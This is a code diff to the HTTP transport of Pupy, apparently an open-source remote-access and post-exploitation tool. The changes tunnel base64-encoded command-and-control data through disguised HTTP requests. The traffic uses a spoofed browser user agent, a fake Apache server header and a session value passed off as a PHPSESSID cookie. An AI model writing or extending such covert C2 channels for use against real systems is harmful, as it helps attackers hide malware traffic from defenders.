@@ -29,13 +29,13 @@ error_response+="Content-Length: %s\r\n"%len(error_response_body)
 error_response+="\r\n"
 error_response+=error_response_body
 
-class PupyHTTPTransport(BasePupyTransport):
+class PupyAsyncHTTPTransport(BasePupyTransport):
     """
     Implements the http protocol transport for pupy.
     """
     pass
 
-class PupyHTTPClient(PupyHTTPTransport):
+class PupyAsyncHTTPClient(PupyAsyncHTTPTransport):
     client=True
     method="GET"
     keep_alive=True
@@ -43,7 +43,7 @@ class PupyHTTPClient(PupyHTTPTransport):
     user_agent="Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
     host=None # None for random
     def __init__(self, *args, **kwargs):
-        PupyHTTPTransport.__init__(self, *args, **kwargs)
+        PupyAsyncHTTPTransport.__init__(self, *args, **kwargs)
         self.headers={"User-Agent" : self.user_agent}
         if self.host is not None:
             self.headers["Host"]=self.host
@@ -53,9 +53,12 @@ class PupyHTTPClient(PupyHTTPTransport):
     def upstream_recv(self, data):
         """
             raw data to HTTP request
+            need to send a request anyway in case of empty data (for pulling purpose !)
         """
         try:
             d=data.peek()
+            if data.cookie is not None:
+                self.headers['Cookie']="PHPSESSID=%s"%data.cookie
 
             request="%s %s%s HTTP/1.1\r\n"%(self.method, self.path, base64.b64encode(d))
             for name, value in self.headers.iteritems():
@@ -76,8 +79,8 @@ class PupyHTTPClient(PupyHTTPTransport):
         d=data.peek()
         decoded_data=b""
         #let's parse HTTP responses :
-        while len(d)>0:
-            if d.startswith("HTTP/1.1 ") and "\r\n\r\n" in d:
+        if d.startswith("HTTP/1.1 ") and "\r\n\r\n" in d:
+            while len(d)>0:
                 try:
                     head, rest=d.split("\r\n\r\n", 1)
                     fl, rheaders=head.split("\r\n",1)
@@ -86,11 +89,7 @@ class PupyHTTPClient(PupyHTTPTransport):
                         if name=="Content-Length":
                             content_length=int(value)
                             break
-                    if content_length is None:
-                        logging.debug("dafuk ? content-length is None")
-                        self.close()
-                        return
-                    elif len(rest)<content_length:
+                    if content_length is None or len(rest)<content_length:
                         break
                     decoded_data+=base64.b64decode(rest[:content_length])
                     length_to_drain=content_length+4+len(head)
@@ -103,12 +102,12 @@ class PupyHTTPClient(PupyHTTPTransport):
             self.upstream.write(decoded_data)
             
 
-class PupyHTTPServer(PupyHTTPTransport):
+class PupyAsyncHTTPServer(PupyAsyncHTTPTransport):
     client=False
     response_code="200 OK" 
     server_header="Apache"
     def __init__(self, *args, **kwargs):
-        PupyHTTPTransport.__init__(self, *args, **kwargs)
+        PupyAsyncHTTPTransport.__init__(self, *args, **kwargs)
         self.headers={
             "Content-Type" : "text/html; charset=utf-8",
             "Server" : self.server_header,
@@ -143,7 +142,14 @@ class PupyHTTPServer(PupyHTTPTransport):
             decoded_data=base64.b64decode(path[1:])
         except:
             raise MalformedData("can't decode b64")
-        return decoded_data
+        cookie=None
+        try:
+            for line in s.split("\r\n"):
+                if line.startswith("Cookie"):
+                    cookie=(line.split(":",1)[1]).split("=")[1].strip()
+        except:
+            pass
+        return decoded_data, cookie
 
     def downstream_recv(self, data):
         """
@@ -158,13 +164,15 @@ class PupyHTTPServer(PupyHTTPTransport):
             for req in tab:
                 try:
                     if req:
-                        newdata = self.http_req2data(req)
+                        newdata, cookie = self.http_req2data(req)
                         decoded_data+=newdata
+                        data.cookie=cookie
                         data.drain(len(req)+4)
-                except MalformedData, InvalidHTTPReq:
-                    logging.debug("invalid/malformed data, answering 404 and closing connection")
+                except MalformedData:
+                    logging.debug("malformed data drained: %s"%repr(req))
+                    data.drain(len(req)+4) # drain malformed data
+                    self.downstream.drain()
                     self.downstream.write(error_response)
-                    self.close()
                     return
                 except Exception as e:
                     break
